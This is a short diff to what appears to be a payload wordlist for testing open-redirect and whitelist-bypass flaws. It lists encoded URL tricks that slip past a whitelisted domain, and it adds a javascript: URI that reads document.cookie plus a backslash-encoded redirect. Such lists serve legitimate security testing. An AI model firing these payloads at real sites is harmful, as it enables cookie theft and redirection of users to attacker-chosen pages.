@@ -258,3 +258,5 @@ http://google.com%3F.www.whitelisteddomain.tld/
 http://google.com%23.www.whitelisteddomain.tld/
 http://www.whitelisteddomain.tld:80%40google.com/
 http://www.whitelisteddomain.tld%2egoogle.com/
+/x:1/:///%01javascript:alert(document.cookie)/
+/https:/%5cgoogle.com/
